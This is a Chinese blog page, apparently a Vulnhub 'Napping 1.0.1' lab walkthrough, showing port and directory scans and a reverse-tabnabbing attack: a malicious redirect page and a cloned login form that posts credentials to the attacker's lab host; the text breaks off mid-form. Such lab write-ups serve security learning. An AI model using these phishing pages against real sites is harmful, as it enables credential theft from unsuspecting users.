<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/fee85f10b8393710.css" as="style"/><link rel="stylesheet" href="/_next/static/css/fee85f10b8393710.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/NScZb57d-O5AQ_AjxQ0ms/_buildManifest.js" defer=""></script><script src="/_next/static/NScZb57d-O5AQ_AjxQ0ms/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubNapping 1 0 1","contentHtml":"\u003ch1\u003eNapping: 1.0.1\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/napping-101,752/\"\u003ehttps://www.vulnhub.com/entry/napping-101,752/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e端口扫描主机发现\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e探测存活主机，\u003ccode\u003e3\u003c/code\u003e是靶机，\u003ccode\u003ekali\u003c/code\u003e的\u003ccode\u003eip\u003c/code\u003e为\u003ccode\u003e192.168.56.10\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-10 14:32 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00036\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eA:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00052\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:F3:\u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003eD (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.3\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00048\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:EE:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eD (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.10\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测主机所有开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.3\u003c/span\u003e  \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-10 14:32 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.3\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00068\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http\nMAC Address: \u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:EE:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eD (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.3\u003c/span\u003e    \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-10 14:33 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.3\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00049\u003c/span\u003es latency).\n\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003ep1 Ubuntu \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eubuntu0.\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e (Ubuntu Linux; protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e ((Ubuntu))\nMAC Address: \u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:EE:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eD (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e.X|\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e.X\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.8\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enikto -host \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e -port \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e\n- Nikto v2\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n---------------------------------------------------------------------------\n---------------------------------------------------------------------------\n+ Target IP:          \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e\n+ Target Hostname:    \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e\n+ Target Port:        \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e\n+ Start Time:         \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e (GMT8)\n---------------------------------------------------------------------------\n+ Server: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.41\u003c/span\u003e (Ubuntu)\n+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies\n+ /: The anti-clickjacking X-Frame-Options header \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e-Options header \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e. This could allow the user agent to render the content of the site \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a different fashion to the MIME \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e-header/\n+ No CGI Directories found (use \u003cspan class=\"hljs-string\"\u003e'-C all'\u003c/span\u003e to force check \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e possible dirs)\n+ Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.41\u003c/span\u003e appears to be outdated (current \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e at least Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.54\u003c/span\u003e). Apache \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.34\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e the EOL \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the \u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003ex branch.\n+ /: Web Server returns a valid response \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e junk HTTP methods which may cause false positives.\n+ /config.php: PHP Config file may contain database IDs \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e passwords.\n+ \u003cspan class=\"hljs-number\"\u003e8106\u003c/span\u003e requests: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e error(s) \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e item(s) reported on remote host\n+ End Time:           \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e:08 (GMT8) (\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e seconds)\n---------------------------------------------------------------------------\n+ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host(s) tested\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e优先级依旧\u003ccode\u003e80\u003c/code\u003e\u003e\u003ccode\u003e22\u003c/code\u003e ,不过没扫描出什么漏洞\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问主页，\u003ccode\u003eCSS\u003c/code\u003e使用的是\u003ccode\u003ebootstrap\u003c/code\u003e 的链接，没有魔法可能会加载不了样式\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubNapping%201%200%201/image80.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edirsearch -u http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e\n//\n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:05:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e] Starting: \n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:05:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /config.php\n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:05:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  539B  - /index.php/login/\n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:05:\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -    0B  - /logout.php  -\u003e  index.php\n[\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:05:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  563B  - /register.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/index.php/login/\u003c/code\u003e 登录页\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/register.php\u003c/code\u003e 注册页\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e注册用户\u003ccode\u003etest\u003c/code\u003e密码\u003ccode\u003e123456\u003c/code\u003e ，登录后台跳转到\u003ccode\u003ewelcome.php\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ewelcome.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubNapping%201%200%201/image81.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\nHello, test! Welcome to our free blog promotions site.\nPlease submit your link so that we can get started. All links will be reviewed by our admin\n\u003cspan class=\"hljs-comment\"\u003e##\u003c/span\u003e\n你好，test！欢迎来到我们的免费博客推广网站。\n请提交您的链接，以便我们开始。所有链接都将由我们的管理员审核\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e说是输入链接后管理员会获取检查我们链接\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e输入链接，链接提交后会有个\u003ccode\u003ehere\u003c/code\u003e 标签，发现是\u003ccode\u003eReverse Tabnabbing\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e什么是\u003ccode\u003eReverse Tabnabbing\u003c/code\u003e ：\u003ca href=\"https://owasp.org/www-community/attacks/Reverse_Tabnabbing\"\u003ehttps://owasp.org/www-community/attacks/Reverse_Tabnabbing\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubNapping%201%200%201/image82.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e制作钓鱼页面\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e恶意页面\u003ccode\u003ea.html\u003c/code\u003e（跳转用）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;!DOCTYPE html\u003e\n\u0026#x3C;html\u003e\n \u0026#x3C;body\u003e\n  \u0026#x3C;script\u003e\n   \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(window.opener) mainframe.location.replace=(\u003cspan class=\"hljs-string\"\u003e'http://192.168.56.10:1234/login.htm'\u003c/span\u003e);\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(window.opener  != window) mainframe.location.replace=(\u003cspan class=\"hljs-string\"\u003e'http://192.168.56.10:1234/login.htm'\u003c/span\u003e);\n  \u0026#x3C;/script\u003e\n \u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e钓鱼页面，使用靶机的\u003ccode\u003elogin.htm\u003c/code\u003e页面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;!DOCTYPE html\u003e\n\u0026#x3C;html lang=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u003e\n\u0026#x3C;head\u003e\n    \u0026#x3C;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u003e\n    \u0026#x3C;title\u003eLogin\u0026#x3C;/title\u003e\n    \u0026#x3C;link rel=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e href=\u003cspan class=\"hljs-string\"\u003e\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\"\u003c/span\u003e\u003e\n    \u0026#x3C;style\u003e\n        body{ font: 14px sans-serif; }\n        .wrapper{ width: 360px; padding: 20px; }\n    \u0026#x3C;/style\u003e\n\u0026#x3C;/head\u003e\n\u0026#x3C;body\u003e\n    \u0026#x3C;div \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"wrapper\"\u003c/span\u003e\u003e\n        \u0026#x3C;h2\u003eLogin\u0026#x3C;/h2\u003e\n        \u0026#x3C;p\u003ePlease fill \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e your credentials to login.\u0026#x3C;/p\u003e\n\n        \u0026#x3C;div \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"alert alert-danger\"\u003c/span\u003e\u003eInvalid username \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e password.\u0026#x3C;/div\u003e\n        \u0026#x3C;form action=\u003cspan class=\"hljs-string\"\u003e\"http://192.168.56.10:1234\"\u003c/span\u003e method=\u003cspan class=\"hljs-string\"\u003e\"post\"\u003c/span\u003e\u003e\n            \u0026#x3C;div \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"form-group\"\u003c/span\u003e\u003e\n                \u0026#x3C;label\u003eUsername\u0026#x3C;/label\u003e\n                \u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text\"\u003c/span\u003e name=\u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"form-control \"\u003c/span\u003e value=\u003cspan class=\"hljs-string\"\u003e\"test\"\u003c/span\u003e\u003e\n                \u0026#x3C;span \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"invalid-feedback\"\u003c/span\u003e\u003e\u0026#x3C;/span\u003e\n            \u0026#x3C;/div\u003e    \n            \u0026#x3C;div \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"form-group\"\u003c/span\u003e\u003e\n                \u0026#x3C;label\u003ePassword\u0026#x3C;/label\u003e\n                \u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e name=\u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"form-control \"\u003c/span\u003e\u003e\n                \u0026#x3C;span \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"invalid-feedback\"\u003c/span\u003e\u003e\u0026#x3C;/span\u003e\n            \u0026#x3C;/div\u003e\n            \u0026#x3C;div \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"form-group\"\u003c/span\u003e\u003e\n                \u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"submit\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"btn btn-primary\"\u003c/span\u003e value=\u003cspan 